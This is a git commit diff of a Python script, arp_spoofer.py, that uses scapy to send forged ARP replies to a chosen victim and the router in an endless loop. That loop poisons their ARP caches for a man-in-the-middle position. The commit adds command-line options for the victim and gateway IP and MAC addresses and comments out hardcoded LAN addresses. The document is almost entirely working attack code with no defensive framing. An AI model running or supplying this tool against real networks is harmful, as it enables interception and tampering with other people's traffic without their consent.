5d0675c2214f8bdebecc7a2a1b7e6a090bb847cd
Ribbera <44053489+Ribbera@users.noreply.github.com>
2021-07-26 23:49:19 +0200

    Add files via upload

--- arp_spoofer.py
+++ arp_spoofer.py
@@ -1,32 +1,35 @@
-# To run this correctly you need Ubuntu or other similar distro 
-# Remember before run the spoofer run this command in root:  echo 1 > /proc/sys/net/ipv4/ip_forward
-
 import scapy.all as scapy 
 import time
 import sys
+import optparse
+
+def get_arguments():
+    parser=optparse.OptionParser()
+    parser.add_option("--target", dest = "target_ip", help="La ip de la victima")
+    parser.add_option("--targetmac", dest = "target_mac", help="La MAC de la victima")
+    parser.add_option("--gateway", dest = "gateway_ip", help="La ip del router")
+    parser.add_option("--gatewaymac", dest = "gateway_mac", help="La MAC del router")
+    (options, arguments) = parser.parse_args()
+    return options
 
 def spoof(target_ip, spoof_ip, target_mac):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
 
-target_ip = "192.168.1.93"
-gateway_ip = "192.168.1.1"
-target_mac = "c8:e2:65:63:8d:05"
-gateway_mac = "cc:d4:a1:e9:89:de"
+# target_ip = "192.168.1.93"
+# gateway_ip = "192.168.1.1"
+# target_mac = "c8:e2:65:63:8d:05"
+# gateway_mac = "cc:d4:a1:e9:89:de"
 
+options = get_arguments()
 sent_packet_count = 0
 try:
     while True:
-        spoof(target_ip, gateway_ip, target_mac)
-        spoof(gateway_ip, target_ip, gateway_mac)
+        spoof(options.target_ip, options.gateway_ip, options.target_mac)
+        spoof(options.gateway_ip, options.target_ip, options.gateway_mac)
         sent_packet_count = sent_packet_count + 2
         print("\r[+] Packets sent: " + str(sent_packet_count)),
         time.sleep(2)
 
 except KeyboardInterrupt:
-        print("[+] Closing ARP SPOOF")
-        
-       
-    
-    
-  
+        print("[+] Cerrando ARP SPOOF")
